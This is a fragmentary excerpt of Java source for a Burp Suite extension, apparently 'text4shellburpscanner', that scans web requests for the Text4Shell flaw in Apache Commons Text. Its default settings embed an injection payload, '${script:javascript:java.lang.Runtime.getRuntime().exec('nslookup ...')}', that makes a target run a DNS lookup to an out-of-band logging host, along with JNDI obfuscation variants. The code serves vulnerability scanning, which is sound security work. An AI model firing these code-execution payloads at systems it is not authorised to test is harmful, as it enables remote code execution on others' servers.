...
//    private JTextArea jndiTextArea;
    ...
    private JCheckBox text4shellpassivepattern_box;
    ...
    private String firstparam; // jndi:   的点，可以自定义jndi:的bypass方式
...
//        String burppayload = "";
        ...
        String ceyetoken = "";
        String secondparam = "javascript:java.lang.Runtime.getRuntime().exec('nslookup%20";
//        Boolean burpdns = true;
        ...
        if (os.toLowerCase().startsWith("win")) {
            f = new File("text4shellburpscanner.properties");
        }else{
            String jarPath = callbacks.getExtensionFilename(); // 获取当前jar的路径
            f = new File(jarPath.substring(0, jarPath.lastIndexOf("/")) + "/" + "text4shellburpscanner.properties");
        }
        ...
        if (!f.exists())
        {
            try {
                ...
                try (FileWriter fileWriter = new FileWriter(f)) {
                    ...
                    fileWriter.append("\n");
                    fileWriter.append("firstparam=script:");
                    fileWriter.append("\n");
                    fileWriter.append("secondparam=javascript:java.lang.Runtime.getRuntime().exec('nslookup%20");
                    fileWriter.append("\n");
                    fileWriter.append("prefixparam=$");
                    fileWriter.append("\n");
                    fileWriter.append("suffixparam=')");
                    fileWriter.append("\n");
                    fileWriter.append("firstparams=jndi:、j$%7b::-n%7ddi:");
                    fileWriter.append("\n");
...
//        this.burpdns = burpdns ;
        ...
        callbacks.setExtensionName("text4shellburpscanner");
        this.stdout.println("=============================================");
        this.stdout.println("[+]              load successful!            ");
        this.stdout.println("[+]        text4shellburpscanner v0.20.2         ");
        this.stdout.println("[+] https://github.com/f0ng/text4shellburpscanner");
...
//                BurpExtender.this.jndiTextArea = new JTextArea();
                ...
                panel12.setBorder(BorderFactory.createTitledBorder("text4shell switch")); // ceye的配置
                ...
                btn1.addMouseListener(new MouseAdapter() {
                    ...
                    public void mouseClicked(MouseEvent e){
                        ...
                        String total = "";
//                        if (text4shellpassivepattern_box.isSelected()){ //写入是否使用text4shell被动扫描 参数
//                            total = total + "usetext4shell=1\n";
//                        }else{
//                            total = total + "usetext4shell=0\n";
//                        }
                        ...
                        total = total + "firstparam=" + fieldd1.getText().trim() + "\n"; // 写入jndi:参数
                        total = total + "secondparam=" + fieldd2.getText().trim() + "\n"; // 写入协议名称dns ldap rmi
...
//                        total = total + "firstparams=" + jndiTextArea.getText().replace("\n","、").trim() + "\n"; // 写入白名单
                ...
                btn2.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mouseClicked(MouseEvent e){
                        BurpExtender.this.text4shellpassivepattern_box.setSelected(true);
                        ...
                        fieldd1.setText("script:");
                        fieldd2.setText("javascript:java.lang.Runtime.getRuntime().exec('nslookup%20");
                        fieldd31.setText("$");
                        fieldd3.setText("')");
                        fielddreplace.setText(".");
                ...
                JLabel label12 = new JLabel("text4shell Passive Scanner:");
                BurpExtender.this.text4shellpassivepattern_box = new JCheckBox(); // 是否使用ceye
                ...
                layout12.setHorizontalGroup(layout12.createSequentialGroup()
                        ...
                        .addGroup(layout12.createParallelGroup(GroupLayout.Alignment.LEADING)
                                .addComponent(BurpExtender.this.text4shellpassivepattern_box))
                );
...
//                JLabel labell222 = new JLabel("firstparams:(active scan)");
...
//                panell22.add(btn_11);
                ...
                JLabel labell1 = new JLabel("firstparam");
                BurpExtender.this.fieldd1 = new JTextField(); // jndi参数

                JLabel labell2 = new JLabel("secondparam:");
...
//                BurpExtender.this.Rtable2.addTab("custom params2",panell22); //将自定义参数页面添加到JTabbedPane
                ...
                String jndi_param = FileGetValue(f, "firstparam"); // jndi参数
                fieldd1.setText(jndi_param);

                String secondparam_param = FileGetValue(f, "secondparam"); // secondparam 参数
                fieldd2.setText(secondparam_param);
...
//                String jndi_params = FileGetValue(f,"firstparams");
...
//            stdout.println(this.ceyeio);
            ...
            if ( !BurpExtender.this.text4shellpassivepattern_box.isSelected() ) // 关闭被动扫描
                return null;
...
//            if ( !BurpExtender.this.)
            ...
            this.secondparam = FileGetValue(f, "secondparam").trim();
            this.firstparam = FileGetValue(f,"firstparam").trim();
...
//            vulnurl = "${" + this.firstparam + this.secondparam.trim()  + this.logxn_dnslog.trim() + "/%20user}";
//        }
...
//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
                            ...
                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response3).getStatusCode() + "", "text4shell rce " + param_vuln, newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
...
//
////        JMenu jMenu = new JMenu("text4shell");
//
////        jMenu.add(jMenuItem);
...
////                    }else
////                        vulnurl = "${" + this.firstparam + this.secondparam.trim() + "//" + firstheaders[0].trim().toLowerCase() + "." + host  + uri + "." + random_str + "." + this.logxn_dnslog.trim() + "/%20user}";
////            String vulnurl = "${" + this.firstparam + this.secondparam.trim() + "://" + firstheaders[0].trim() + "." + host  + uri + "."+ this.logxn_dnslog.trim() + "/%20user}";
//
...
//                            if (iii == 0) {
//                                body = body.replace("%24", "$").replace(this.firstparam.trim(), jndi_lists.get(iii)).replace(random_str,random_lists.get(iii));
//                                body = body.replace("$","%24");
//                                for (int jjj = 0; jjj < request_header_single.size(); jjj++) {
//                                    request_header_single.set(jjj, request_header_single.get(jjj).replace("%24", "$").replace(this.firstparam.trim(), jndi_lists.get(iii)).replace(random_str,random_lists.get(iii)));
...
//                                                    BurpExtender.this.Udatas.add(new TablesData(row, reqMethod, url.toString(), BurpExtender.this.helpers.analyzeResponse(response).getStatusCode() + "", "text4shell rce " + param_vuln, newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
//                                                    fireTableRowsInserted(row, row);
//                                                    List<IScanIssue> issues = new ArrayList(1);
//                                                    issues.add(new CustomScanIssue(
//                                                            httpService,
